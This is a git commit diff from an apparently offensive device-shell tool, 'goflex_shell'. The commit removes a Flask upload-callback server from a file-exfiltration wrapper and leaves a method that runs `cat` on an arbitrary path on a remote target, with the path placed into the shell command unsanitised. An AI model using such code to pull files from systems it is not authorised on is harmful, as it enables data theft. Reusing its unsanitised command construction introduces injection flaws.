b0c08b51075a7f9879432b0a2a4776e65b426c30
Xiddoc <46180972+Xiddoc@users.noreply.github.com>
2024-01-06 01:14:51 +0200

    Cleaned up file exfiltration

--- wrappers/exfiltrate_file.py
+++ wrappers/exfiltrate_file.py
@@ -1,27 +1,8 @@
-from typing import List
-
-from flask import Flask, request
-
 from goflex_shell.command_executor import CommandExecutor
 from wrappers.base_wrapper import BaseCommand
 
-FORM_FILE_UPLOAD = "data"
-CALLBACK_HOST = '0.0.0.0'
-CALLBACK_PORT = 80
-
 
 class ExfiltrateFiles(BaseCommand):
-    def __init__(self, ip: str):
-        super().__init__(ip)
-
-        app = Flask(__name__)
-
-        # noinspection PyUnusedFunction
-        @app.route("/upload", methods=["POST"])
-        def store():
-            print(request.form[FORM_FILE_UPLOAD])
-
-        self.app = app
 
     def execute(self, path: str) -> bytes:
         return CommandExecutor.execute(self.ip, f'cat "{path}"')
